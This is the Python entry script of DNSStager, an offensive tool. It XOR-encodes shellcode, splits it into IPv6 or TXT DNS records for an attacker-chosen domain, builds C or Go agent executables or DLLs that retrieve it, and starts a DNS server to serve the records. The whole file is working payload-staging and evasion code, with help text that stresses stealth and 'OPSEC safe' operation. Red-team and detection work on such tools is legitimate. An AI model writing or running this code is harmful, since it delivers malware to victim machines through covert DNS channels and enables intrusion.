#!/usr/bin/python3



import argparse
from core.dnsserver import *
from core.functions import *
from core.builders import *


check_root()

parser = argparse.ArgumentParser(description='DNSStager main parser')
parser.add_argument(
    '--domain',
    required=False,
    help='The domain you want to use as staging host'
)
parser.add_argument(
    '--payloads',
    required=False,
    help='show all payloads',
    action='store_true'
)
parser.add_argument(
    '--prefix',
    required=False,
    help='Prefix to use as part of your subdomain schema'
)
parser.add_argument(
    '--payload',
    required=False,
    help='Payload to use, see --payloads for more details'
)
parser.add_argument(
    '--output',
    required=False,
    help='Agent output path'
)
parser.add_argument(
    '--shellcode_path',
    required=False,
    help='Shellcode file path'
)
parser.add_argument(
    '--xorkey',
    required=False,
    help='XOR key to encode your payload with'
)
parser.add_argument(
    '--sleep',
    required=False,
    help='sleep for N seconds between each DNS request'
)
parser.add_argument(
    '--format',
    required=False,
    help='payload format (.dll or .exe)',
)
parser.add_argument(
    '--tcp',
    required=False,
    help='Start and use the DNS server via TCP protocol',
    action='store_true'
)

args = parser.parse_args()
payloads = args.payloads
domain = args.domain
prefix = args.prefix
payload = args.payload
shellcode_path = args.shellcode_path
output = args.output
key = args.xorkey
sleep = args.sleep
format = args.format
tcp = args.tcp


if format == ".exe":
    format_to_use = ".exe"

elif format == ".dll":
    format_to_use = ".dll"

elif format == None:
    format_to_use = ".exe"

else:
    print_error("Payload format should be .exe or .dll")
    exit()

if payloads:
    show_payloads()
    exit()

banner()

if domain is None:
    print_error("Please specify a domain name using --domain")
    exit()


if payload is None:
    print_error("Please specify a payload to use using --payload")
    exit()

if output is None:
    print_error("Please choose a path to save your agent to using --output")
    exit()

if prefix is None:
    print_error("Please choose prefix for your subdomains using --prefix")
    exit()

if shellcode_path is None:
    print_error("Please specify shellcode path using --shellcode_path")
    exit()
else:
    shellcode = read_shellcode(shellcode_path)
    if shellcode:
        pass
    else:
        print("Shellcode file is not exist!")

if check_domain_name(domain):
    domain_to_use = domain
else:
    print_error("Please check your domain name")
    exit()

if sleep is None:
    print_error("Please specify time to sleep using --sleep")
    print_info("Choosing sleep time will keep your agent work stealthy and totally OPSEC safe")
    print_info("Use --sleep 0 if you don't want to sleep between requests")
    exit()

if sleep is not None:
    try:
        sleep_value = int(args.sleep)
        sleep = args.sleep
    except ValueError:
        print_error("Sleep must be in seconds")
        exit()


if tcp is None:
    tcp_status = False
else:
    tcp_status = True


if key is None:
    key = 0x00
else:
    original_key = key
    key = convert_string_key_to_int(key)



if payload in dnsstager_payloads:
    payload_tokens = payload.split("/")
    arch = payload_tokens[0]
    language = payload_tokens[1]
    mode = payload_tokens[2]
    print_info("DNSStager will generate agent for %s architecture" % arch)
    print_info("DNSStager will generate %s agent for you" % language.upper())
    print_info("DNSStager will use %s to transfer your shellcode" % mode.upper())
    if key:
        print_info("DNSStager will encode your payload using XOR key %s" % original_key)
    else:
        print_info("DNSStager will not encode your payload using XOR")
        encode_answer = input("[?]\033[1m We recommend to XOR your shellcode before you transfer it, do you want to encode your payload (y/n) \033[0m")
        if encode_answer.upper() != "N":
            new_key = input("Please enter the new XOR key (EX: 0x20) >> ")
            key = convert_string_key_to_int(new_key)


    if language == "c" and mode == "ipv6":
        shellcode_size = len(shellcode)
        encoded_shellcode = encode_xor_shellcode(shellcode, key)
        ZONES = generate_zone_ipv6(domain_to_use, encoded_shellcode, prefix)
        if format_to_use == ".exe":
            build_c_xor_ipv6(domain_to_use, prefix, sleep, output, key, arch, shellcode_size)
        elif format_to_use == ".dll":
            build_c_xor_ipv6_dll(domain_to_use, prefix, sleep, output, key, arch, shellcode_size)
        else:
            build_c_xor_ipv6(domain_to_use, prefix, sleep, output, key, arch, shellcode_size)


    if language == "golang" and mode == "ipv6":
        if format_to_use != ".exe":
            print_error("GoLang agents should be saved as .exe format only!")
            exit()
        # call golang ipv6
        encoded_shellcode = encode_xor_shellcode(shellcode, key)
        ZONES = generate_zone_ipv6(domain_to_use, encoded_shellcode, prefix)
        build_golang_xor_ipv6(domain_to_use, prefix, sleep, output, key, arch)


    if language == "golang" and mode == "txt":
        if format_to_use != ".exe":
            print_error("GoLang agents should be saved as .exe format only!")
            exit()
        # call golang txt
        encoded_xor_shellcode = encode_xor_shellcode(shellcode, key).encode()
        encoded_shellcode = encode_shellcode_base64(encoded_xor_shellcode)
        ZONES = generate_zone_TXT(domain, encoded_shellcode, prefix)
        build_golang_base64_txt(domain_to_use, prefix, sleep, output, arch, key)

else:
    print_error("Payload not found, please use --payloads to list all payloads")
    exit()



start_dns_server(ZONES, tcp_status)
